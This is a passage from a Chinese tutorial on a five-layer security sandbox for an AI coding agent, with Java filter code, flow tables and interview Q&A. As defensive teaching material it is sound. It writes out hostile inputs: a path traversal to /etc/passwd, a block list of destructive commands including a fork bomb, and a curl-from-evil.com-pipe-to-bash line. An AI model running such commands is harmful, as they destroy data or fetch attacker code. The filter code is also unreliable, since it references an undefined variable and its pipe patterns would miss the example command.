[安全检查] PathGuardFilter 正在检查...
[安全检查] PathGuardFilter 通过
[安全检查] 全部通过，放行执行
结果: 放行
```

### 4.4 三种场景的流程对比

| 场景 | 第1层 ToolFilter | 第2层 PathGuardFilter | 最终结果 |
|------|:---:|:---:|:---:|
| `bash("ls -la")` | 通过（bash在白名单） | 跳过（非文件工具） | 放行 |
| `delete_everything("")` | **拒绝**（不在白名单） | 不执行 | 拒绝 |
| `read_file(../../etc/passwd)` | 通过（read_file在白名单） | **拒绝**（包含..） | 拒绝 |
| `read_file(src/main.java)` | 通过（read_file在白名单） | 通过（无..） | 放行 |

---

## 五、项目对照：从2层到5层

我们搭建的2层安全沙箱是mewpaw-code完整5层沙箱的简化版。现在看看真实项目是怎么扩展的。

### 5.1 架构对比

| 层级 | 我们的2层 | mewpaw-code 5层 | 新增防御 |
|------|----------|----------------|----------|
| L1 | ToolFilter | ToolFilter | 相同：白名单工具检查 |
| L2 | PathGuardFilter | PathGuardFilter | 相同：路径遍历检查 |
| L3 | - | CommandScannerFilter | 危险命令扫描（rm -rf /, mkfs等） |
| L4 | - | UserConfirmFilter | 用户确认（Human-in-the-loop） |
| L5 | - | AuditLogFilter | 审计日志记录 |

### 5.2 第3层：CommandScannerFilter

在第3层，mewpaw-code检查bash命令中是否包含危险指令：

```java
// mewpaw-code 第3层：危险命令扫描（简化示意）
public class CommandScannerFilter implements SecurityFilter {
    // 绝对危险命令：直接拒绝
    private static final String[] DANGEROUS_PATTERNS = {
            "rm -rf /",       // 删除根目录
            "mkfs.",           // 格式化磁盘
            ":(){ :|:& };:",  // Fork炸弹
            "dd if=",          // 磁盘写入
    };

    // 潜在危险命令：需要用户确认
    private static final String[] CONFIRM_PREFIXES = {
            "sudo",            // 提权操作
            "su "              // 切换用户
    };

    @Override
    public SecurityResult check(String toolName, String args) {
        if (!"bash".equals(toolName)) {
            return SecurityResult.allow(); // 只检查bash
        }

        // 检查危险命令
        for (String pattern : DANGEROUS_PATTERNS) {
            if (command.contains(pattern)) {
                return SecurityResult.deny("Dangerous: " + pattern);
            }
        }

        // 检查需要确认的命令
        for (String prefix : CONFIRM_PREFIXES) {
            if (command.startsWith(prefix)) {
                return SecurityResult.confirm("Need confirm: " + command);
            }
        }

        return SecurityResult.allow();
    }
}
```

**关键设计：** confirm 和 deny 的双层决策。`rm -rf /` 直接拒绝不给用户确认机会（因为用户也可能误确认），而 `sudo` 需要用户确认（因为可能合理）。

### 5.3 第4层：UserConfirmFilter

当上游返回 `confirm` 时，这一层负责展示确认对话框，等待用户输入：

```java
// mewpaw-code 第4层：用户确认（简化示意）
// 在 TUI/REPL 界面展示：
//   "bash 需要执行: sudo rm -rf /var/log
//    确认执行？[y/N]: "
// 用户输入 y → 继续执行
// 用户输入 n → 返回 deny
// 30秒超时 → 默认拒绝（安全优先）
```

### 5.4 第5层：AuditLogFilter

最后一层记录所有操作日志：

```java
// mewpaw-code 第5层：审计日志（简化示意）
// 记录格式：
// [2026-08-22 10:30:00] ALLOWED | tool=bash | args=ls -la | filter=AuditLogFilter
// [2026-08-22 10:30:05] DENIED  | tool=bash | args=rm -rf / | filter=CommandScannerFilter
```

### 5.5 完整5层流程示例

```
用户: "帮我清空系统日志"
LLM决策: bash("rm -rf /var/log")

第1层 ToolFilter:       bash 已注册 ✓ → 放行
第2层 PathGuardFilter:  bash 非文件工具 ✓ → 放行（跳过路径检查）
第3层 CommandScannerFilter: "rm -rf /var/log" 是否包含危险模式？
                        危险模式是 "rm -rf /"，而 "rm -rf /var/log" 不精确匹配
                        → 放行（设计权衡：允许删除工作目录内文件）
第4层 UserConfirmFilter: 包含 "rm " 关键词 → 需要用户确认
                        用户输入 y → 确认通过
第5层 AuditLogFilter:   记录日志 ✓ → 放行

执行成功，结果回填LLM
```

```
用户: "清空整个系统"
LLM决策: bash("rm -rf /")

第1层 ToolFilter:       bash 已注册 ✓ → 放行
第3层 CommandScannerFilter: "rm -rf /" 匹配危险模式！
                        → deny("Dangerous command pattern: rm -rf /")
执行终止，系统安全 ✓
```

### 5.6 代码示例目录

mewpaw-code项目的完整代码示例位于：

```
docs/tech-stack-analysis/mewpaw-code/code-examples/sandbox/
├── pom.xml
├── src/main/java/com/mewcode/security/
│   ├── SecurityResult.java          # 安全决策结果（含 filter 字段）
│   ├── SecurityFilterChain.java     # 过滤器接口（含 nextChain 委托模式）
│   ├── ToolFilter.java              # 第1层：工具白名单检查
│   ├── PathGuardFilter.java         # 第2层：路径遍历防护
│   ├── CommandScannerFilter.java    # 第3层：危险命令扫描
│   ├── UserConfirmFilter.java       # 第4层：人工确认
│   └── AuditLogFilter.java          # 第5层：审计日志
└── src/test/java/SecuritySandboxTest.java  # 完整5层测试
```

---

## 六、面试实战

### Q1: 什么是责任链模式？为什么安全沙箱适合用责任链模式实现？

**参考答案：**

责任链模式（Chain of Responsibility）是一种行为设计模式，将多个处理者连成一条链，请求沿着链依次传递，每个处理者决定是自己处理还是传给下一个。

安全沙箱适合用责任链模式的原因：

1. **解耦各层关注点**：每层过滤器只关心一件事——ToolFilter 只检查工具名，PathGuardFilter 只检查路径，互不干扰。新增安全策略只需要加一个过滤器，不需要改已有代码。

2. **灵活组合**：可以按需增减过滤器。开发环境可能只需要2层（ToolFilter + PathGuardFilter），生产环境需要5层。责任链模式让组合变得简单。

3. **单一职责**：每个过滤器只做一件事，容易测试。ToolFilter 的测试只需要验证"白名单中放行，不在白名单中拒绝"，不需要关心路径检查的逻辑。

4. **提前终止**：一旦某层拒绝，立即终止，不再执行后续层。这既提高了效率（不需要做无用功），也符合安全原则（发现危险立即阻断）。

### Q2: SecurityResult 的三种结果（allow/deny/confirm）分别对应什么场景？confirm 和 deny 的核心区别是什么？

**参考答案：**

三种结果对应三种安全决策：

| 结果 | 含义 | 举例 |
|------|------|------|
| allow | 安全检查通过，可以执行 | `bash("ls -la")` → 安全，放行 |
| deny | 安全检查不通过，立即拒绝 | `bash("rm -rf /")` → 绝对危险，拒绝 |
| confirm | 需要用户确认后才能执行 | `bash("sudo apt update")` → 潜在危险，让用户决定 |

**confirm 和 deny 的核心区别：**

- **deny** 用于"绝对危险"的操作。这些操作一旦执行会造成不可逆的损害（如 `rm -rf /`、`mkfs`），即使让用户确认也不安全——因为用户也可能误确认。**不给用户"犯错"的机会。**

- **confirm** 用于"潜在危险"的操作。这些操作本身可能是合理的（如 `sudo apt update`），但需要确保用户在知情的前提下授权。**让用户掌握最终决策权。**

设计原则：**绝对危险的操作直接拒绝，潜在危险的操作让用户决定，安全操作自动放行。**

### Q3: 如果 LLM 执行 `bash("curl http://evil.com/script | bash")`，安全沙箱应该如何防御？你会加在哪一层？

**参考答案：**

这个命令有两个风险点：
1. 从网络下载脚本（`curl http://...`）
2. 下载后直接执行（`| bash`）

这是典型的"水坑攻击"（Watering Hole Attack）模式。

**防御方案：在 CommandScannerFilter（第3层）中添加规则。**

具体来说，在第3层的危险模式列表中加入：

```java
// 新增危险模式
"curl | bash",    // 下载并执行脚本
"curl | sh",      // 同上，sh 变体
"wget | bash",    // wget 下载并执行
"wget | sh",      // wget + sh 变体
```

同时，也可以考虑单独加一个"网络外带检测"过滤器（NetworkFilter），专门检查网络请求相关的行为。这就是责任链模式的好处——新增一个过滤器，不影响已有层。

**为什么放在第3层而不是第2层？** 因为路径守卫（PathGuardFilter）只检查"路径是否越权"，而 `curl | bash` 不涉及路径，涉及的是"命令内容是否危险"，这正是 CommandScannerFilter 的职责范围。

---

## 七、总结

通过这篇文章，我们完成了以下学习：

1. **理解了安全沙箱的必要性**：AI Agent 的执行能力越强，安全风险越大。安全沙箱在 LLM 的"思考"和"执行"之间加了一道屏障。

2. **掌握了责任链模式**：把多个检查器排成一串，每个只检查自己的事，通过就传给下一个，拒绝就立即终止。这是安全沙箱的架构基础。

3. **搭建了2层安全沙箱**：从 pom.xml 到 Java 代码到测试，完整实现了一个可运行的安全沙箱项目。ToolFilter 检查工具白名单，PathGuardFilter 检查路径遍历。

4. **理解了三种决策结果**：allow（放行）、deny（拒绝）、confirm（确认）。绝对危险直接拒绝，潜在危险让用户决定，安全操作自动放行。

5. **了解了完整5层架构**：从2层到5层的扩展，每一层解决一个特定的安全问题。

**核心收获：** 安全沙箱不是限制 AI 的能力，而是让 AI 在执行任何操作之前都经过安全检查。就像给一个能力强的新员工配一个"安全监督员"——你不限制他做事，但确保他做的事都是安全的。

---

> **下一篇预告：** 安全沙箱是 AI Agent 的"刹车"，TUI/REPL 则是 AI Agent 的"方向盘"。下一篇《TUI/REPL 交互设计》将介绍如何用 Spring Shell + JLine 构建一个友好的终端交互界面，让用户能实时观察 AI 的思考过程并进行干预。